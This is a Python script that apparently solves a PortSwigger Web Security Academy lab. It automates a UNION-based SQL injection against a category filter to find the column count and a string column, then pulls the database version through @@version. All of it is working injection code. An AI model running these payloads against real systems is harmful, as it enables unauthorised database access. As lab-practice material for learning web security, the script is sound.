#!/usr/bin/env python3
"""
SQL injection attack, querying the database type and version on MySQL and Microsoft
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 04-db-version-mysql-microsoft.md

What this does:
    Confirms the UNION SELECT column count and text-bearing column position
    against the category filter, then extracts the database version via the
    @@version variable -- valid syntax on both MySQL and MSSQL, so this one
    payload works regardless of which of the two engines is behind the lab.

Usage:
    python 04-db-version-mysql-microsoft.py <lab-url>

Requirements:
    pip install httpx
"""

import sys
import httpx

MAX_COLS = 10


def detect_union_cols(client: httpx.Client, url: str) -> tuple[int, int]:
    """Return (column_count, string_col_index). No FROM clause needed here."""
    column_count = 0
    for n in range(1, MAX_COLS + 1):
        nulls = ",".join(["NULL"] * n)
        payload = f"Gifts' UNION SELECT {nulls}-- "
        r = client.get(f"{url}/filter", params={"category": payload})
        if r.status_code == 200 and "error" not in r.text.lower()[:200]:
            column_count = n
            print(f"[+] UNION column count: {n}")
            break
    if not column_count:
        raise RuntimeError("Could not determine column count")

    probe = "SQLI_COL_PROBE"
    string_col_index = 0
    for i in range(column_count):
        parts = ["NULL"] * column_count
        parts[i] = f"'{probe}'"
        payload = f"Gifts' UNION SELECT {','.join(parts)}-- "
        r = client.get(f"{url}/filter", params={"category": payload})
        if probe in r.text:
            string_col_index = i
            print(f"[+] String column index: {i}")
            break

    return column_count, string_col_index


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    column_count, string_col_index = detect_union_cols(client, lab_url)

    parts = ["NULL"] * column_count
    parts[string_col_index] = "@@version"
    payload = f"Gifts' UNION SELECT {','.join(parts)}-- "
    r = client.get(f"{lab_url}/filter", params={"category": payload})
    print(f"[*] Response length: {len(r.text)} bytes")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- database version retrieved via UNION.")
    else:
        print("[-] Not solved yet -- search the response body for the version banner.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
